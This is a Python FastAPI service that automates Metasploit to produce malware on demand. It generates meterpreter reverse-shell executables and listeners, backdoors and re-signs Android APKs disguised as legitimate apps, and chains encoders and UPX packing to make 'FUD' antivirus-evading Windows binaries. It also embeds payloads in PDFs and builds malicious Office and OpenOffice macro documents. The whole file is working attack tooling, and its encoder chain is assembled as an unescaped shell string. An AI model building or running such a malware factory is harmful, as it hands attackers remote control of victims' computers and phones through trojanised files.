import os
import shutil
import subprocess
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from hashlib import sha256
import json

WORKSPACE = Path("/workspace")
TASKS_ROOT = WORKSPACE / "tasks"

class Artifact(BaseModel):
    name: str
    path: str
    size_bytes: int
    sha256: Optional[str] = None

class TaskStatus(str):
    SUBMITTED = "SUBMITTED"
    PREPARING = "PREPARING"
    RUNNING = "RUNNING"
    SUCCEEDED = "SUCCEEDED"
    FAILED = "FAILED"
    CANCELLED = "CANCELLED"

class Task(BaseModel):
    id: str
    date: str
    kind: str
    state: str
    created_at: float
    started_at: Optional[float] = None
    finished_at: Optional[float] = None
    params: Dict[str, str] = {}
    artifacts: List[Artifact] = []
    logs: Dict[str, str] = {}
    error: Optional[str] = None

app = FastAPI(title="Headless Orchestrator", version="0.1.0")

tasks: Dict[str, Task] = {}
locks: Dict[str, threading.Lock] = {}


def _now_str_date() -> str:
    return datetime.utcnow().strftime("%Y%m%d")


def _ensure_dir(p: Path) -> None:
    p.mkdir(parents=True, exist_ok=True)


def _sha256sum(path: Path) -> Optional[str]:
    try:
        out = subprocess.check_output(["sha256sum", str(path)], text=True)
        return out.split()[0]
    except Exception:
        return None


def _write_file(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)


def _spawn(cmd: List[str], log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
    with log_path.open("w") as lf:
        proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env)
        return_code = proc.wait()
    return return_code


def _prepare_task(kind: str, params: Dict[str, str]) -> (Task, Path):
    date = _now_str_date()
    task_id = f"{uuid.uuid4().hex[:8]}-{kind}"
    base = TASKS_ROOT / date / task_id
    for sub in ("input", "temp", "output", "logs"):
        _ensure_dir(base / sub)
    t = Task(id=task_id, date=date, kind=kind, state=TaskStatus.SUBMITTED, created_at=time.time(), params=params, logs={})
    tasks[task_id] = t
    locks[task_id] = threading.Lock()
    return t, base


def _finalize_task(t: Task, base: Path, succeeded: bool, err: Optional[str] = None) -> None:
    t.finished_at = time.time()
    t.state = TaskStatus.SUCCEEDED if succeeded else TaskStatus.FAILED
    t.error = err
    # collect artifacts
    artifacts: List[Artifact] = []
    for p in sorted((base / "output").glob("**/*")):
        if p.is_file():
            artifacts.append(Artifact(name=p.name, path=str(p), size_bytes=p.stat().st_size, sha256=_sha256sum(p)))
    t.artifacts = artifacts
    # write status.json
    _write_file(base / "logs" / "status.json", t.model_dump_json(indent=2))


# Background runners for three kinds

def run_payload_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    cmd = [
        "msfvenom",
        "-p", params.get("payload", "windows/meterpreter/reverse_tcp"),
        f"LHOST={params.get('lhost','127.0.0.1')}",
        f"LPORT={params.get('lport','4444')}",
        "-f", "exe",
        "-o", str(base / "output" / (params.get("output_name", "payload") + ".exe")),
    ]
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    rc = _spawn(cmd, build_log)
    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfvenom rc={rc}")


def run_listener_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    rc_path = base / "output" / "handler.rc"
    rc_content = f"""
use exploit/multi/handler
set PAYLOAD {params.get('payload','windows/meterpreter/reverse_tcp')}
set LHOST {params.get('lhost','0.0.0.0')}
set LPORT {params.get('lport','4444')}
set ExitOnSession false
exploit -j -z
""".strip()
    _write_file(rc_path, rc_content)
    run_log = base / "logs" / "run.log"
    cmd = [
        "msfconsole", "-qx", f"resource {rc_path}; sleep 2; jobs; exit -y"
    ]
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["run"] = str(run_log)
    rc = _spawn(cmd, run_log)
    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfconsole rc={rc}")


def _file_exists(path: Path) -> bool:
    try:
        return path.exists() and path.is_file()
    except Exception:
        return False


def _unzip_list(path: Path) -> str:
    try:
        out = subprocess.check_output(["unzip", "-l", str(path)], text=True, stderr=subprocess.STDOUT)
        return out
    except Exception as e:
        return f"unzip failed: {e}"


def _aapt_badging(path: Path) -> str:
    aapt = WORKSPACE / "tools/android-sdk/aapt"
    if not aapt.exists():
        return "aapt not found"
    try:
        out = subprocess.check_output([str(aapt), "dump", "badging", str(path)], text=True, stderr=subprocess.STDOUT)
        return out
    except Exception as e:
        return f"aapt failed: {e}"


def _jarsigner_verify(path: Path) -> str:
    jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
    try:
        out = subprocess.check_output([jarsigner, "-verify", "-certs", str(path)], text=True, stderr=subprocess.STDOUT)
        return out
    except subprocess.CalledProcessError as e:
        return e.output if isinstance(e.output, str) else str(e)
    except Exception as e:
        return f"verify failed: {e}"


def _write_json(path: Path, data: dict) -> None:
    _ensure_dir(path.parent)
    path.write_text(json.dumps(data, indent=2))


def run_android_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    # config
    mode = params.get("mode", "backdoor_apk")  # backdoor_apk | standalone
    perm_strategy = params.get("perm_strategy", "keep")  # keep | merge
    payload = params.get("payload", "android/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_apk = base / "output" / (params.get("output_name", "app_backdoor") + ".apk")
    # signing params
    keystore = params.get("keystore_path")
    key_alias = params.get("key_alias")
    ks_pass = params.get("keystore_password")
    key_pass = params.get("key_password", ks_pass)

    build_log = base / "logs" / "build.log"
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)

    succeed = False
    err = None

    if mode == "standalone":
        # Generate standalone APK via msfvenom
        cmd = [
            "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
            "-o", str(output_apk)
        ]
        rc = _spawn(cmd, build_log)
        if rc != 0:
            err = f"msfvenom standalone rc={rc}"
        else:
            succeed = _file_exists(output_apk)
    else:
        # backdoor_apk mode (default)
        # write config files expected by backdoor_apk
        config_path = WORKSPACE / "config" / "config.path"
        _ensure_dir(config_path.parent)
        config_lines = [
            "", "", "", "unzip", "/usr/bin/jarsigner", "unzip", "/usr/bin/keytool",
            str(WORKSPACE / "tools/android-sdk/zipalign"), str(WORKSPACE / "tools/android-sdk/dx"),
            str(WORKSPACE / "tools/android-sdk/aapt"), str(WORKSPACE / "tools/apktool/apktool"),
            str(WORKSPACE / "tools/baksmali233/baksmali"), "/usr/bin/msfconsole", "/usr/bin/msfvenom",
            str(WORKSPACE / "backdoor_apk"), "searchsploit", str(base / "output"),
        ]
        _write_file(config_path, "\n".join(config_lines) + "\n")
        # ensure input apk in task folder
        sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
        dst_apk = base / "input" / "original.apk"
        if params.get("apk_path") and Path(params["apk_path"]).exists():
            shutil.copy2(params["apk_path"], dst_apk)
        else:
            shutil.copy2(sample, dst_apk)
        # write apk.tmp for the script
        apk_tmp = WORKSPACE / "config" / "apk.tmp"
        _write_file(apk_tmp, "\n".join([
            str(dst_apk),
            str(output_apk),
            payload,
            lhost,
            lport,
        ]) + "\n")
        # run script and choose permissions
        choice = b"1\n" if perm_strategy == "keep" else b"2\n"
        with build_log.open("w") as lf:
            proc = subprocess.Popen(["bash", str(WORKSPACE / "backdoor_apk")], stdin=subprocess.PIPE, stdout=lf, stderr=subprocess.STDOUT)
            try:
                proc.stdin.write(choice)
                proc.stdin.flush()
            except Exception:
                pass
            rc = proc.wait()
        succeed = _file_exists(output_apk)
        if not succeed:
            err = f"backdoor_apk rc={rc}"

    # optional re-sign if keystore provided and artifact exists
    if succeed and keystore and Path(keystore).exists():
        try:
            unsigned = output_apk
            # align to temp
            aligned = base / "temp" / "aligned.apk"
            _ensure_dir(aligned.parent)
            zipalign = str(WORKSPACE / "tools/android-sdk/zipalign")
            subprocess.check_call([zipalign, "4", str(unsigned), str(aligned)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            # sign
            jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
            sign_cmd = [jarsigner, "-sigalg", "SHA256withRSA", "-digestalg", "SHA-256",
                        "-keystore", keystore, "-storepass", ks_pass or "", "-keypass", key_pass or "",
                        str(aligned), key_alias or "signing.key"]
            subprocess.check_call(sign_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            # verify
            _ = _jarsigner_verify(aligned)
            # replace output
            shutil.move(str(aligned), str(output_apk))
        except Exception as e:
            # keep original but report signing failure
            err = (err or "") + f"; resign failed: {e}"

    # validations and report
    report = {
        "mode": mode,
        "payload": payload,
        "lhost": lhost,
        "lport": lport,
        "artifact": str(output_apk) if _file_exists(output_apk) else None,
        "precheck": {},
        "postcheck": {}
    }
    if _file_exists(output_apk):
        try:
            with open(output_apk, 'rb') as f:
                report["sha256"] = sha256(f.read()).hexdigest()
        except Exception:
            report["sha256"] = None
        report["postcheck"]["unzip_list"] = _unzip_list(output_apk)
        report["postcheck"]["aapt_badging"] = _aapt_badging(output_apk)
        report["postcheck"]["jarsigner_verify"] = _jarsigner_verify(output_apk)
        _write_json(base / "output" / "report.json", report)

    _finalize_task(t, base, succeeded=succeed, err=err)


def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    arch = params.get("arch", "x86")  # x86|x64
    output_name = params.get("output_name", "win_fud")
    encoders = params.get("encoders", "")  # e.g. x86/shikata_ga_nai:10,x86/countdown:5
    upx_flag = params.get("upx", "false").lower() == "true"

    exe_path = base / "output" / f"{output_name}.exe"

    # build msfvenom pipeline
    ven_cmd = [
        "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
        "-f", "raw"
    ]
    # Apply encoder chain
    pipeline = []
    if encoders.strip():
        # first stage
        stages = [e.strip() for e in encoders.split(",") if e.strip()]
        # build a chain of msfvenom calls consuming raw input
        for i, st in enumerate(stages):
            parts = st.split(":")
            enc = parts[0]
            it = parts[1] if len(parts) > 1 else "1"
            # for first pass read from previous, else still from previous stage
            # We will construct shell pipeline string for simplicity
        # Since building complex pipelines via Popen list is cumbersome, fallback to shell string safely
        chain = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw"
        for st in stages:
            p = st.split(":")
            enc = p[0]
            it = p[1] if len(p) > 1 else "1"
            chain += f" | msfvenom -a x86 --platform windows -e {enc} -i {it} -f raw"
        # final conversion to exe
        chain += f" | msfvenom -a {'x86' if arch=='x86' else 'x64'} --platform windows -f exe -o \"{exe_path}\""
        cmd = ["bash", "-lc", chain]
    else:
        # single pass directly to exe
        cmd = [
            "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
            "-a", ("x86" if arch == "x86" else "x64"), "--platform", "windows",
            "-f", "exe", "-o", str(exe_path)
        ]

    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    rc = _spawn(cmd, build_log)

    # optional upx
    if rc == 0 and upx_flag and exe_path.exists():
        try:
            subprocess.check_call(["upx", "--best", str(exe_path)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        except Exception:
            pass

    succeeded = (rc == 0 and exe_path.exists())
    _finalize_task(t, base, succeeded=succeeded, err=None if succeeded else f"winexe rc={rc}")


def _msfconsole_run(rc_content: str, log_path: Path) -> int:
    rc_file = log_path.parent / "task.rc"
    _write_file(rc_file, rc_content)
    return _spawn(["msfconsole", "-qx", f"resource {rc_file}; exit -y"], log_path)


def _copy_msf_local(filename: str, dest: Path) -> bool:
    src = Path.home() / ".msf4" / "local" / filename
    if src.exists():
        _ensure_dir(dest.parent)
        shutil.copy2(src, dest)
        return True
    return False


def run_pdf_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_name = params.get("output_name", "document")
    base_pdf = params.get("base_pdf_path")
    if not base_pdf or not Path(base_pdf).exists():
        base_pdf = str(WORKSPACE / "PE" / "original.pdf")
    exe_path = base / "temp" / "embed.exe"
    _ensure_dir(exe_path.parent)
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    # build simple exe via msfvenom
    rc0 = _spawn(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", str(exe_path)], build_log)
    if rc0 != 0:
        _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc0}")
        return
    # run msfconsole to embed
    rc_text = f"""
use windows/fileformat/adobe_pdf_embedded_exe
set EXE::Custom {exe_path}
set FILENAME {output_name}.pdf
set INFILENAME {base_pdf}
exploit
""".strip()
    rc1 = _msfconsole_run(rc_text, build_log)
    # copy result
    pdf_out = base / "output" / f"{output_name}.pdf"
    ok = _copy_msf_local(f"{output_name}.pdf", pdf_out)
    _finalize_task(t, base, succeeded=ok, err=None if ok else f"pdf embed rc={rc1}")


def run_office_task(task_id: str, base: Path, params: Dict[str, str]):
    t = tasks[task_id]
    with locks[task_id]:
        t.state = TaskStatus.PREPARING
    build_log = base / "logs" / "build.log"
    target = params.get("suite_target", "ms_word_windows")  # ms_word_windows|ms_word_mac|openoffice_windows|openoffice_linux
    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
    lhost = params.get("lhost", "127.0.0.1")
    lport = params.get("lport", "4444")
    output_name = params.get("output_name", "doc_macro")
    module = None
    extra = ""
    if target in ("ms_word_windows", "ms_word_mac"):
        module = "exploit/multi/fileformat/office_word_macro"
        ext = ".doc"
    elif target == "openoffice_windows":
        module = "exploit/multi/misc/openoffice_document_macro"
        extra = "set target 0"
        ext = ".odt"
    else:
        module = "exploit/multi/misc/openoffice_document_macro"
        extra = "set target 1"
        ext = ".odt"
    with locks[task_id]:
        t.state = TaskStatus.RUNNING
        t.started_at = time.time()
        t.logs["build"] = str(build_log)
    rc_text = f"""
use {module}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set FILENAME {output_name}{ext}
{extra}
exploit
""".strip()
    rc = _msfconsole_run(rc_text, build_log)
    doc_out = base / "output" / f"{output_name}{ext}"
    ok = _copy_msf_local(f"{output_name}{ext}", doc_out)
    _finalize_task(t, base, succeeded=ok, err=None if ok else f"office rc={rc}")


# API models
class CreateTaskRequest(BaseModel):
    kind: str  # payload|listener|android|winexe|pdf|office
    params: Dict[str, str] = {}

class TaskResponse(BaseModel):
    task: Task


@app.post("/tasks", response_model=TaskResponse)
def create_task(req: CreateTaskRequest):
    if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office"):
        raise HTTPException(status_code=400, detail="Unsupported kind")
    t, base = _prepare_task(req.kind, req.params)
    # seed defaults
    if req.kind == "android":
        # copy a sample APK if none provided
        if not Path(req.params.get("apk_path", "")).exists():
            sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
            if sample.exists():
                dst = base / "input" / "original.apk"
                shutil.copy2(sample, dst)
                t.params["apk_path"] = str(dst)
    # run in background
    def runner():
        if req.kind == "payload":
            run_payload_task(t.id, base, t.params)
        elif req.kind == "listener":
            run_listener_task(t.id, base, t.params)
        elif req.kind == "android":
            run_android_task(t.id, base, t.params)
        elif req.kind == "winexe":
            run_winexe_task(t.id, base, t.params)
        elif req.kind == "pdf":
            run_pdf_task(t.id, base, t.params)
        elif req.kind == "office":
            run_office_task(t.id, base, t.params)
    threading.Thread(target=runner, daemon=True).start()
    return TaskResponse(task=t)


@app.get("/tasks/{task_id}", response_model=TaskResponse)
def get_task(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    return TaskResponse(task=t)


@app.get("/tasks/{task_id}/artifacts", response_model=List[Artifact])
def list_artifacts(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    return t.artifacts


@app.post("/tasks/{task_id}/cancel", response_model=TaskResponse)
def cancel_task(task_id: str):
    t = tasks.get(task_id)
    if not t:
        raise HTTPException(status_code=404, detail="Not found")
    # This simple implementation marks as cancelled if still running
    if t.state in (TaskStatus.SUBMITTED, TaskStatus.PREPARING, TaskStatus.RUNNING):
        t.state = TaskStatus.CANCELLED
        t.finished_at = time.time()
        _write_file(TASKS_ROOT / t.date / t.id / "logs" / "status.json", t.model_dump_json(indent=2))
    return TaskResponse(task=t)


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=False)